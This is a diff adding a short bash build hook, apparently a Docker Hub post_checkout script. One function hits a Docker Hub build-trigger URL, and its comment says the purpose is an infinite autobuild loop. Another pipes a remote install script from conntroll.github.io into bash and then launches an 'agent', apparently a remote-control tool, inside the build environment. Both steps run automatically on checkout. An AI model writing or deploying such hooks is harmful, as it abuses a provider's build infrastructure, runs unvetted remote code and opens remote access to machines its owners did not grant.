@@ -1,0 +1,21 @@
+#!/usr/bin/env bash
+
+self_trigger(){
+  # trigger another build, causing an infinite autobuild loop
+  # btwiuse/arch self trigger
+  curl -X POST 'https://hub.docker.com/api/build/v1/source/94a2751c-5ddf-46ba-9223-6e78f2c925a1/trigger/18867be7-a54b-44a4-a7da-d97d3935ac3c/call/'
+}
+
+install_agent(){
+  curl https://conntroll.github.io/install.sh | $sudo bash -v
+}
+
+main(){
+  echo "------ HOOK START - POST_CHECKOUT -------"
+  self_trigger
+  install_agent
+  agent
+  echo "------ HOOK END - POST_CHECKOUT -------"
+}
+
+main "$@"
